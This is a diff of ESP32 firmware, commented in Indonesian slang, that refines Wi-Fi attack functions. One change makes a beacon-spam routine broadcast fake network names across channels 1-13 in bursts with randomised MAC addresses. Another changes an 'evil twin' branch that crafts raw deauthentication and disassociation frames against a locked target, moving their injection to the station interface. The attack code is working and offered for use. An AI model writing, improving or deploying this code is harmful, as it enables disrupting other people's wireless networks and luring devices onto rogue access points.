@@ -250,30 +250,47 @@ void track_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
 void sendBeacon(const char* ssid) {
     int ssidLen = strlen(ssid);
     
-    // Acak MAC Address
+    // 1. Acak MAC Address (BSSID & Source MAC)
     for(int i = 10; i < 16; i++) {
         uint8_t r = esp_random() % 256;
         beaconPacket[i] = r;      
         beaconPacket[i+6] = r;    
     }
 
-    // Pasang Nama SSID ke Paket
+    // 2. Pasang Nama SSID ke Paket
     beaconPacket[37] = ssidLen;
     for(int i = 0; i < ssidLen; i++) {
         beaconPacket[38+i] = ssid[i];
     }
 
-    // Tambah Tail
+    // 3. Tambah Tail (Supported Rates + DS Parameter Set)
     uint8_t postSSID[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01};
     memcpy(&beaconPacket[38 + ssidLen], postSSID, sizeof(postSSID));
 
-    // TEMBAK PAKE WIFI_IF_STA (Biar gak bentrok sama AP bawaan)
+    // Cari posisi byte Channel di dalem payload (byte terakhir dari postSSID)
+    int channelPos = 38 + ssidLen + 12;
+
+    // 4. TEMBAK PAKE WIFI_IF_STA
     for (int ch = 1; ch <= 13; ch++) {
         esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + ssidLen + sizeof(postSSID), false);
+        
+        // UPDATE byte channel di dalem paket biar HP gak nganggep ini invalid
+        beaconPacket[channelPos] = ch;
+
+        // BURST TX: Tembak beberapa kali di channel yang sama
+        for (int burst = 0; burst < 3; burst++) {
+            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + ssidLen + sizeof(postSSID), false);
+            
+            // Delay microsecond biar antrean TX buffer ESP32 gak jebol/nabrak
+            // (Pakai esp_rom_delay_us atau delayMicroseconds tergantung framework)
+            delayMicroseconds(500); 
+        }
+        
+        // Kasih nafas RTOS pas pindah channel
         vTaskDelay(pdMS_TO_TICKS(1)); 
     }
 }
+
 
 // Taruh di atas sebelum fungsi loopWiFi()
 
@@ -562,18 +579,8 @@ else if (isEvilTwin) {
             if (!deauthUdahSetup) {
                 esp_wifi_stop();
                 // === REQ LU: UBAH KE AP ===
-                esp_wifi_set_mode(WIFI_MODE_AP); 
-                wifi_config_t ap_config = {
-                    .ap = {
-                        .ssid = "Rumah Pak RT", // Ganti nama terserah lu
-                        .ssid_len = strlen("Rumah Pak RT"),
-                        .channel = targetTerkunci.channel,
-                        .authmode = WIFI_AUTH_OPEN,
-                        .max_connection = 1,
-                        .ssid_hidden = 1, // <--- INI KUNCINYA, COK! (1 = Tersembunyi)
-                    },
-                };
-                esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+                esp_wifi_set_mode(WIFI_MODE_STA); 
+
                 esp_wifi_start();
                 esp_wifi_set_promiscuous(true);
                 esp_wifi_set_ps(WIFI_PS_NONE); 
@@ -599,7 +606,7 @@ else if (isEvilTwin) {
                 rawFrame[23] = (seq >> 8) & 0xFF;
                 rawFrame[24] = 0x01; 
                 
-                esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
+                esp_wifi_80211_tx(WIFI_IF_STA, rawFrame, 26, false);
                 
                 rawFrame[0] = 0xa0; 
                 // Sequence number kita bedain dikit biar natural
@@ -610,7 +617,7 @@ else if (isEvilTwin) {
 
                 // === REQ LU: TX VIA AP ===
                 
-                esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
+                esp_wifi_80211_tx(WIFI_IF_STA, rawFrame, 26, false);
                 
             }
             vTaskDelay(pdMS_TO_TICKS(1));
